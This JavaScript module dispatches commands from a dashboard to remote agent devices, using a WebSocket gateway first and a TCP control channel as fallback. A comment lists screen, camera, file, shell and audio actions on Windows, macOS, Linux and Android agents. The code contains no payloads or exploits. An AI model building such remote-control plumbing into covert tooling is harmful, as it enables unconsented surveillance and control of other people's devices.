/**
 * Route dashboard commands to agents via control plane (/ws/control or TCP)
 * first, then fall back to JSON gateway WebSocket.
 */
const { sendCommandToAgent, getControlAgent } = require('../control/controlHandler');

function getGatewaySocket(deviceId, activeConnections) {
    const id = String(deviceId || '').trim();
    if (!id) return null;
    const agentKey = `AGENT_${id}`;
    const deviceKey = `DEVICE_${id}`;
    const socket = activeConnections.get(agentKey) || activeConnections.get(deviceKey);
    if (socket && socket.readyState === 1 && !socket._placeholder) return socket;

    const lowerId = id.toLowerCase();
    for (const [key, sock] of activeConnections.entries()) {
        if ((key.startsWith('AGENT_') || key.startsWith('DEVICE_')) && sock.readyState === 1 && !sock._placeholder) {
            const devId = key.replace(/^AGENT_|^DEVICE_/, '');
            if (devId.toLowerCase() === lowerId) {
                return sock;
            }
        }
    }
    return null;
}

function isCommandReady(deviceId, activeConnections) {
    const id = String(deviceId || '').trim();
    if (!id) return false;
    if (Boolean(getGatewaySocket(id, activeConnections))) return true;
    const control = getControlAgent(id);
    if (control?.socket && !control.socket.destroyed) return true;
    return false;
}

function dispatchAgentCommand(deviceId, action, payload = {}, activeConnections) {
    const id = String(deviceId || '').trim();
    const act = String(action || '').trim();
    if (!id || !act) return { ok: false, reason: 'missing' };

    const liveLogBus = require('../services/liveLogBus');

    // 1. Prioritize Gateway WebSocket (where Windows, macOS, Linux, and Android execute screen, camera, files, shell, audio)
    const socket = getGatewaySocket(id, activeConnections);
    if (socket) {
        try {
            const outboundPacket = {
                action: act,
                payload: payload || {},
                ...(typeof payload === 'object' && payload !== null ? payload : {}),
                timestamp: new Date().toISOString(),
            };
            socket.send(JSON.stringify(outboundPacket));
            if (!act.startsWith('REMOTE_')) {
                liveLogBus.push({
                    channel: 'node',
                    level: 'info',
                    message: `[NODE:REACT] Dispatched ${act} to device ${id} via Gateway WS`,
                    deviceId: id,
                    meta: { action: act, transport: 'gateway' }
                });
            }
            return { ok: true, transport: 'gateway' };
        } catch (_) {
            // fall through to control
        }
    }

    // 2. Fall back to Control plane (TCP / binary control channel)
    if (sendCommandToAgent(id, act, payload)) {
        if (!act.startsWith('REMOTE_')) {
            liveLogBus.push({
                channel: 'node',
                level: 'info',
                message: `[NODE:REACT] Dispatched ${act} to device ${id} via TCP Control`,
                deviceId: id,
                meta: { action: act, transport: 'control' }
            });
        }
        return { ok: true, transport: 'control' };
    }

    if (!act.startsWith('REMOTE_')) {
        liveLogBus.push({
            channel: 'node',
            level: 'warn',
            message: `[NODE:REACT] Dispatch failed for device ${id} (${act}) — device is OFFLINE`,
            deviceId: id,
            meta: { action: act, reason: 'offline' }
        });
    }
    return { ok: false, reason: 'offline' };
}

function isAgentCommandReachable(deviceId, isLiveGatewayWs, activeConnections) {
    return isCommandReady(deviceId, activeConnections);
}

module.exports = {
    dispatchAgentCommand,
    getGatewaySocket,
    isAgentCommandReachable,
    isCommandReady,
};
